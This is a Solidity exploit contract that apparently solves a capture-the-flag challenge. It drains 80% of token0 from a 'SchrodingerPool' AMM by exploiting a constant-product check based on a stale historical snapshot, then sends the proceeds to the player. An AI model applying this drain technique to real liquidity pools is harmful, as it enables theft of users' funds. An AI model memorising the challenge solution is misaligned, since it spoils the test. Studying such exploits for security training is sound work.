// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../SchrodingerPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attacker {
    SchrodingerPool public pool;
    IERC20 public t0;
    IERC20 public t1;

    constructor(address _pool) {
        pool = SchrodingerPool(_pool);
        t0 = IERC20(pool.token0());
        t1 = IERC20(pool.token1());
    }

    function exploit() external {
        (uint256 r0, uint256 r1, ) = pool.getReserves();
        
        // 1. Approve
        t0.approve(address(pool), type(uint256).max);
        t1.approve(address(pool), type(uint256).max);

        // 2. Add tiny liquidity to become LP
        pool.mint(address(this), 1 ether, 1 ether);

        // 3. Temporal Swap
        // We drain 80% of token0. Because kRequired is based on a smaller
        // historical snapshot, the swap will pass.
        uint256 amountToDrain = (r0 * 80) / 100;
        pool.swap(amountToDrain, 0, address(this));

        // 4. Burn LP to clean up
        pool.burn(address(this), pool.balanceOf(address(this)));

        // 5. Transfer funds back to player
        t0.transfer(msg.sender, t0.balanceOf(address(this)));
        t1.transfer(msg.sender, t1.balanceOf(address(this)));
    }
}